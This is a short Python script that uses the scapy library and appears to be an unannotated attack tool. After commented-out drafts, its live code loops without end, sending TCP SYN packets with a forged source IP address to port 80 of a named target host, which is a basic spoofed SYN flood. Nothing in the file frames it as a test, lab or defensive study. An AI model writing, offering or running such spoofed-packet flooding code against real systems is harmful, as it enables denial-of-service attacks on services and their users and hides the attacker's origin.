# from scapy.all import *
# import time

# def send_icmp_packets(ip='127.0.0.1'):
#     while True:
#         packet = IP(src="192.168.1.100", dst="10.0.0.1")/TCP(dport=80)
#         send(packet, count=10)  # Send 10 packets
#         # packet = IP(dst=ip)/ICMP()
#         # send(packet, verbose=False)
#         print("Sent ICMP packet")
#         time.sleep(1)  # Delay between packets (adjust as needed)

# send_icmp_packets()


# # from scapy.all import *
# # # Replace '192.168.1.100' with your specific IP address
# # packet = IP(src="192.168.1.100", dst="10.0.0.1")/TCP(dport=80)
# # send(packet, count=10)  # Send 10 packets

from scapy.all import *
import time

# Define the target and spoofed IP
target_ip = "www.example.com"
spoofed_ip = "1.32.232.0"
target_port = 80

# Create and send SYN packets
while True:
    packet = IP(src=spoofed_ip, dst=target_ip)/TCP(dport=target_port, flags="S")
    send(packet, count=10)# Send 10 packets
    time.sleep(1)